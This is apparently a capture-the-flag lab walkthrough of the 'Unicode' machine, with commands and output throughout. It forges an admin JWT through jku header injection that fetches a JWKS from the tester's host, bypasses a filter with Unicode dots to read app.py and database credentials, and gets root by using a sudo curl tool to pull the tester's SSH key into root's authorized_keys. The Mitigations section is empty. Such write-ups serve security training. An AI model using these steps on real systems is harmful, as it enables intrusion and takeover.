
# Unicode

- Walkthrough
- Mitigrations
- References


## Walkthrough

The tester started by performing an nmap scan.

```
# Nmap 7.93 scan initiated Sun Dec  3 13:31:08 2023 as: nmap -p 80,22 -A -oA service_scan 10.10.11.126
Nmap scan report for 10.10.11.126
Host is up (0.067s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fda0f7939ed3ccbdc23c7f923570d777 (RSA)
|   256 8bb6982dfa00e5e29c8faf0f449903b1 (ECDSA)
|_  256 c989273e91cb51276f3989361041df7c (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: 503
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec  3 13:31:18 2023 -- 1 IP address (1 host up) scanned in 9.46 seconds
```

The scan showed that port 80 was open and hosting a threat analisys company. Its possible to create an account on the site that brought up a report upload page and also revealed that the site is using json web token(JWT) for authenication. 

insert screen on jwk ------------------------


when the JWK is decoded it shows that the JWK uses the jku header that points to the URL containing the JWKS file containing the public key for verifying the token. 


screen of decoded jwk --------------


If it is possible to change the jku header to point to an attacker controlled server an malicious public key can subsitiued to allow the malicious actor to forge a ticket and have the server verify it on the malicious actors server. This server has controls in place to prevent the server from verifying the token on another server. 

The tester used gobuster to bruteforce the web sites directories and found a "redirect" endpoint. 

```
└──╼ [★]$ gobuster dir -t 1 -u http://10.10.11.126/  -w '/home/rang3r/Documents/Tools/SecLists-master/Discovery/Web-Content/common.txt' --exclude-length 9294
===============================================================
Gobuster v3.1.0

/checkout             (Status: 308) [Size: 264] [--> http://10.10.11.126/checkout/]
/dashboard            (Status: 308) [Size: 266] [--> http://10.10.11.126/dashboard/]
/debug                (Status: 308) [Size: 258] [--> http://10.10.11.126/debug/]    
/display              (Status: 308) [Size: 262] [--> http://10.10.11.126/display/]  
/error                (Status: 308) [Size: 258] [--> http://10.10.11.126/error/]    
/internal             (Status: 308) [Size: 264] [--> http://10.10.11.126/internal/] 
/login                (Status: 308) [Size: 258] [--> http://10.10.11.126/login/]    
/logout               (Status: 308) [Size: 260] [--> http://10.10.11.126/logout/]   
/pricing              (Status: 308) [Size: 262] [--> http://10.10.11.126/pricing/]  
/redirect             (Status: 308) [Size: 264] [--> http://10.10.11.126/redirect/] 
/register             (Status: 308) [Size: 264] [--> http://10.10.11.126/register/] 
/upload               (Status: 308) [Size: 260] [--> http://10.10.11.126/upload/]     
                                                                                    
===============================================================
2023/12/07 23:53:49 Finished
===============================================================

```

Using the redirect endpoint it was possible for the tester to set the jku header to point to the redirect endpoint and set it to point to the testers host. The "jwt_tools.py" is able to do this by creating a custom JWK, which the tester then hosted using a python http server. The tester changed the JWK to point to the testers host via the redirect "http://hackmedia.htb/static/../redirect?url=10.10.14.6/jwttool_custom_jwks.json". The tester also changed the user claim part of payload section to admin.
```
┌─[192.168.93.129]─[rang3r@parrot]─[~]
└──╼ [★]$ python  '/home/rang3r/Documents/Tools/tools/web/jwt4/jwt_tool-master/jwt_tool.py'   eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiam9obiJ9.fUXM6uoYSqrXOEEggGoVxSw5q53TeukNNAa0wREc9_dOqPUEr1F2SBsgFdu4P18PNE4yWVYeuSexsGEL3vwWYEKE4awLbzkJnPQPj2_qF3pyVKX0NYNRI-LjpIriPZ6Z-FgnoRo47vEKQG2yMLLSmaI8FS7wrpR7OL42I3USiBh3qPBz26ZwZmtwh7b12vyaFWRsBcybq0-3I-np8eg4DQS51_ZMMNvNxv3VIF8UD3PtBr3hK1iviyfK9ZiQbgiV8SKjfnpi3rat1NQcJRJ50A3VcbbHZZ2pqe-iYruXUZf8anz4PGODYXg3m7aEScBKK8eeqiZ0rKt7gT4lrkrp7A  -X s -ju http://hackmedia.htb/static/../redirect?url=10.10.14.6/jwttool_custom_jwks.json  -I -pc user -pv admin  

<snip>

Original JWT: 

Paste this JWKS into a file at the following location before submitting token request: http://hackmedia.htb/static/../redirect?url=10.10.14.6/jwttool_custom_jwks.json
(JWKS file used: /home/rang3r/.jwt_tool/jwttool_custom_jwks.json)
/home/rang3r/.jwt_tool/jwttool_custom_jwks.json
jwttool_628f71f241a933abf519c578de4e8a42 - Signed with JWKS at http://hackmedia.htb/static/../redirect?url=10.10.14.6/jwttool_custom_jwks.json
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTQuNi9qd3R0b29sX2N1c3RvbV9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.hyY-UHi_VvIfqMcM0yefE80UNOa6bOUpPOYACvbzSBCucnu-cwiCsTTQD1bTb3GDReMyytRPNY0h10PAeSW3ssLRE6UtLXDP0uXFBS_h0ArWYwfhgskcfFaPqS5Q7UvjSp9v7G0lfzUSTDdIFKSGn9ErPUVZn4DFkFaDd6lvgnpeAukCmXuP96_0dbTgZ56wgkVwWC01pKHtcm1bweMBW0OyJKvjkI1Gi_EOoTMExZichPV8vvJCB8xfa5OMvrLEaT7uB_xQ-gSuF3TCz5GkZ-7sAQcdN88cqOt1KxdPEpsI3hjVAsrVFW5jivD8XMka0o9qJFnR98jj9L5lSPaDDA

```
The tester then set up the http server where the json file was located. The tester pasted over the old JWK in the storage sectrion of the browser and refreshed the page. 

```
┌─[192.168.93.129]─[rang3r@parrot]─[~/.jwt_tool]
└──╼ [★]$ sudo python3 -m  http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.126 - - [08/Dec/2023 23:14:25] "GET /jwttool_custom_jwks.json HTTP/1.1" 200 -
```

With admin access, it was possible to use the display endpoint. The endpoint was well filtered however the tester was able to bypass the filter using unicode characters, replacing "." with "‧" allowing the tester to perform a local file inclusion attack. Using this bypass the tester was able to read the source of the web app. The tester discovered the app.py file. 


```
└──╼ [★]$ curl  http://10.10.11.126/display/?page=﹒﹒/app.py -H "Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTQuNi9qd3R0b29sX2N1c3RvbV9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.hyY-UHi_VvIfqMcM0yefE80UNOa6bOUpPOYACvbzSBCucnu-cwiCsTTQD1bTb3GDReMyytRPNY0h10PAeSW3ssLRE6UtLXDP0uXFBS_h0ArWYwfhgskcfFaPqS5Q7UvjSp9v7G0lfzUSTDdIFKSGn9ErPUVZn4DFkFaDd6lvgnpeAukCmXuP96_0dbTgZ56wgkVwWC01pKHtcm1bweMBW0OyJKvjkI1Gi_EOoTMExZichPV8vvJCB8xfa5OMvrLEaT7uB_xQ-gSuF3TCz5GkZ-7sAQcdN88cqOt1KxdPEpsI3hjVAsrVFW5jivD8XMka0o9qJFnR98jj9L5lSPaDDA" | grep db.yaml
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  9738  100  9738    0     0  61937      0 --:--:-- --:--:-- --:--:-- 62025
db=yaml.load(open('db.yaml'))
```

The file contained the file name containing the sql credentials.  

```
┌─[192.168.93.129]─[rang3r@parrot]─[~/Projects/machines/unicode]
└──╼ [★]$ curl  http://10.10.11.126/display/?page=﹒﹒/db.yaml -H "Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTQuNi9qd3R0b29sX2N1c3RvbV9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.hyY-UHi_VvIfqMcM0yefE80UNOa6bOUpPOYACvbzSBCucnu-cwiCsTTQD1bTb3GDReMyytRPNY0h10PAeSW3ssLRE6UtLXDP0uXFBS_h0ArWYwfhgskcfFaPqS5Q7UvjSp9v7G0lfzUSTDdIFKSGn9ErPUVZn4DFkFaDd6lvgnpeAukCmXuP96_0dbTgZ56wgkVwWC01pKHtcm1bweMBW0OyJKvjkI1Gi_EOoTMExZichPV8vvJCB8xfa5OMvrLEaT7uB_xQ-gSuF3TCz5GkZ-7sAQcdN88cqOt1KxdPEpsI3hjVAsrVFW5jivD8XMka0o9qJFnR98jj9L5lSPaDDA" 
mysql_host: "localhost"
mysql_user: "code"
mysql_password: "B3stC0d3r2021@@!"
mysql_db: "user"

```

Using these crentials it was possible to SSH  into the unicode host.

```
┌─[192.168.93.129]─[rang3r@parrot]─[~]
└──╼ [★]$ ssh code@10.10.11.126
code@10.10.11.126's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

<snip>

code@code:~$ id
uid=1000(code) gid=1000(code) groups=1000(code)
code@code:~$ hostname
code
code@code:~$ 

```

The code user was able to run the /usr/bin/treport command as root.


```
code@code:~$ sudo -l 
Matching Defaults entries for code on code:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User code may run the following commands on code:
    (root) NOPASSWD: /usr/bin/treport

```

The "treport" program is used to create, download and read reports. The program uses the curl command to download reports. The command has filter but can be bypassed using brackets. The tester used the program to download the testers public key into the root account's ssh "authorized_keys" file. THe tester had to set up a python http server to host the public key.

```
code@code:~$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:3
Enter the IP/file_name:{10.10.14.6:8081/id_rsa.pub,-o,/root/.ssh/authorized_keys}
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   567  100   567    0     0   8462      0 --:--:-- --:--:-- --:--:--  8462
Enter your choice:

```

```
┌─[192.168.93.129]─[rang3r@parrot]─[~]
└──╼ [★]$ ssh root@10.10.11.126
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

<snip>

root@code:~# id
uid=0(root) gid=0(root) groups=0(root)
root@code:~# hostname
code
root@code:~# 

```

once the public key had been place the tester could SSH into the host as root.


## Mitigations 

## References

- https://jwt.io/
- https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection
- https://github.com/ticarpi/jwt_tool/
- https://0xacb.com/normalization_table
- https://qaz.wtf/u/convert.cgi
